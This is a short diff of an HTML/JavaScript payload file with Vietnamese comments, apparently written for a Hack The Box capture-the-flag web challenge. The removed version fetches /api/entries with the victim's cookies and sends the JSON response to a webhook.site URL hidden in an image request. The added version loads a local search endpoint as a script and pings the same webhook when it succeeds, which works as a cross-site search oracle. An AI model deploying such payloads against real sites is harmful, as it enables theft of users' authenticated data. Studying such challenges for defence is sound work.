@@ -1,27 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>XSS Page</title>
-</head>
-<body>
-    <h1>Loading...</h1>
-    <script>
-        fetch('/api/entries', {
-            credentials: 'include'
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Phương pháp 1: Sử dụng thẻ img
-            const img = new Image();
-            img.src = 'https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282?data=' + encodeURIComponent(JSON.stringify(data));
-            document.body.appendChild(img);
-            
-            // Phương pháp 2: Hiển thị trực tiếp
-            document.body.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
-        })
-        .catch(error => {
-            document.body.innerHTML = 'Error: ' + error;
-        });
-    </script>
-</body>
-</html>
+<script>
+// Tạo thẻ script
+    let script = document.createElement('script');
+    script.src = 'http://127.0.0.1:1337/api/entries/search?q=HTB';
+    script.onload = () => {
+        // Thực hiện hành động sau khi script được tải thành công
+        fetch('https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282/success');
+}
+    script.onerror = () => { };
+    document.head.appendChild(script);
+</script>
